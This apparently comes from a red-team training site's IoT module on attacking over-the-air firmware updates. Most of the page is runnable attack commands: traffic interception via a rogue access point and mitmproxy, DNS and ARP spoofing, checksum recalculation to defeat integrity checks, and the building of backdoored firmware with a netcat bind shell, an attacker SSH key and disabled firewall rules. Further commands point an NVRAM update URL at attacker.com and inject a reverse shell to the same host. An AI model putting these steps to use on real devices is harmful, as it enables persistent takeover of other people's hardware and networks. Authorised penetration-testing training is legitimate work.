---
layout: training-page
title: "OTA Firmware Attack — Red Team Academy"
module: "IoT Hacking"
tags:
  - ota
  - firmware-update
  - mitm
  - downgrade
  - iot
page_key: "iot-ota-attacks"
render_with_liquid: false
---

# OTA Firmware Update Attacks

IoT devices often pull firmware updates over HTTP(S) with weak or absent integrity checking. Intercepting OTA traffic allows attackers to serve malicious firmware, downgrade to vulnerable versions, or extract unencrypted firmware images. Attack surface: update server URLs, signature validation bypass, rollback attacks.

## Intercepting OTA Traffic

```
# Step 1: Put device on network you control
# Use a Raspberry Pi or laptop as AP:
hostapd rogue-ap.conf &
dnsmasq -C dnsmasq.conf

# Step 2: Transparent proxy with mitmproxy:
mitmproxy --mode transparent --listen-port 8080
# Or mitmweb for GUI:
mitmweb --mode transparent --listen-port 8080

# Redirect HTTP/HTTPS through proxy:
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080

# Step 3: Watch for firmware update requests
# Look for large binary downloads (.bin, .img, .tar.gz, .zip)
# Capture raw firmware:
mitmproxy --save-stream-file firmware_capture.mitm

# Export specific request:
# In mitmweb: right-click request → Save → Save content

# Step 4: Disable SSL verification (for pinned certs):
# Extract device APK/binary and patch cert pinning check
# Or use frida to hook SSL validation (if Android-based device)
```

## DNS Spoofing for Update Interception

```
# Identify update server from firmware strings:
strings firmware.bin | grep -E "(http|ftp|update|ota|download)" | grep -v "^#"
# Common: update.vendor.com, ota.vendor.com, firmware.vendor.com

# DNS spoofing with dnsspoof:
dnsspoof -i eth0 -f spoofhosts.txt
# spoofhosts.txt:
# 192.168.1.100  update.vendor.com
# 192.168.1.100  ota.vendor.com

# Or with Responder:
responder -I eth0 -w -P

# Or modify /etc/hosts on device (if you have shell):
echo "192.168.1.100 update.vendor.com" >> /etc/hosts

# Serve malicious firmware:
python3 -m http.server 80
# Place firmware.bin at expected URL path

# ARP spoofing to intercept update traffic:
arpspoof -i eth0 -t DEVICE_IP GATEWAY_IP &
arpspoof -i eth0 -t GATEWAY_IP DEVICE_IP &
```

## Firmware Signature Bypass

```
# Many devices use weak or no signature verification
# Common implementations:
# 1. CRC32 checksum only (not cryptographic)
# 2. MD5/SHA1 hash in header (modifiable)
# 3. RSA signature (hard to bypass without key)
# 4. No verification at all

# Inspect firmware header for signature scheme:
xxd firmware.bin | head -20
strings firmware.bin | grep -i "sign\|rsa\|sha\|md5\|crc"

# If CRC only — recalculate after modification:
# Python: binascii.crc32(data) & 0xFFFFFFFF
python3 -c "
import binascii, struct
with open('firmware.bin', 'rb') as f:
    data = f.read()
crc = binascii.crc32(data[8:]) & 0xFFFFFFFF  # skip first 8 bytes (header)
print(hex(crc))
# Patch CRC at offset 4:
new_header = data[:4] + struct.pack('<I', crc) + data[8:]
open('patched.bin', 'wb').write(new_header)
"

# If MD5 in header:
md5sum modified_firmware_content.bin
# Patch md5 bytes at known offset in header

# firmwalker to find signing logic in extracted FS:
find . -name "*.sh" -exec grep -l "update\|firmware\|check\|verify" {} \;
grep -r "openssl\|signature\|verify" . --include="*.sh" --include="*.py"
```

## Malicious Firmware Creation

```
# Modify extracted filesystem (from binwalk -Me):
# 1. Add persistent backdoor:
echo '#!/bin/sh' > _extracted/squashfs-root/etc/init.d/backdoor
echo 'nc -lkp 4444 -e /bin/sh &' >> _extracted/squashfs-root/etc/init.d/backdoor
chmod +x _extracted/squashfs-root/etc/init.d/backdoor
ln -s /etc/init.d/backdoor _extracted/squashfs-root/etc/rc.d/S99backdoor

# 2. Add SSH key:
mkdir -p _extracted/squashfs-root/root/.ssh
ATTACKER_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMhR8Vz3QK6Yp4l3qz5v0h7XG2nU3tJkPbTk9WmVfRwE attacker@kali"
echo "$ATTACKER_KEY" >> _extracted/squashfs-root/root/.ssh/authorized_keys

# 3. Disable firewall rules in startup scripts:
sed -i 's/iptables -P INPUT DROP/iptables -P INPUT ACCEPT/' \
  _extracted/squashfs-root/etc/init.d/firewall

# Repack squashfs:
mksquashfs _extracted/squashfs-root/ new_squashfs.img -comp lzma -b 256k -noappend

# Rebuild full firmware image (replace original squashfs section):
# Find squashfs offset from binwalk output (e.g., 0x160000 = 1441792)
dd if=firmware.bin of=header.bin bs=1 count=1441792
cat header.bin new_squashfs.img > malicious_firmware.bin

# Serve and trigger update
```

## Downgrade Attacks

```
# Serve older (vulnerable) firmware version to device
# Many devices don't verify version is newer than current

# Find old firmware versions:
# - Vendor FTP/archive pages
# - web.archive.org snapshots of firmware download pages
# - GitHub repositories with version history
# - IoT Village/Exploit-DB

# Force device to accept downgrade:
# 1. Intercept update check request
# 2. Return response pointing to old firmware URL
# 3. Or directly serve old firmware via DNS spoofing

# Check rollback protection:
# If device uses eFuses/secure boot counter — rollback blocked
# If version checked in /tmp or NVRAM — may be patchable

# Downgrade to version with known CVE:
# Example: downgrade to firmware with CVE-2018-10561 (GPON auth bypass)
# Then exploit via standard PoC
```

## OTA Attack on Embedded Linux (Update Script Analysis)

```
# After extracting firmware, find update scripts:
find . -name "update*.sh" -o -name "upgrade*.sh" -o -name "flash*.sh" 2>/dev/null
find . -name "*.sh" | xargs grep -l "wget\|curl\|tftp\|update" 2>/dev/null

# Common update script pattern:
cat update.sh
# #!/bin/sh
# URL=$(nvram get fw_url)
# wget -O /tmp/fw.bin $URL
# if [ $(md5sum /tmp/fw.bin | cut -d' ' -f1) == "$(nvram get fw_md5)" ]; then
#   mtd write /tmp/fw.bin firmware
# fi

# Attack: if URL is stored in NVRAM and nvram is writable:
nvram set fw_url="http://attacker.com/malicious.bin"
nvram set fw_md5="$(md5sum malicious.bin | cut -d' ' -f1)"
nvram commit

# Or exploit command injection in URL handling:
nvram set fw_url='http://a.com/f.bin; nc attacker.com 4444 -e /bin/sh'
```

## Tools & Resources

- mitmproxy — `mitmproxy.org` — HTTPS interception proxy
- Firmware Mod Kit — `github.com/rampageX/firmware-mod-kit`
- binwalk — `github.com/ReFirmLabs/binwalk` — firmware extraction
- RouterSploit — OTA-related exploit modules
- Attify OS — `attify.com` — IoT pentesting Linux distro
- OWASP IoT — I7: Insecure Software/Firmware
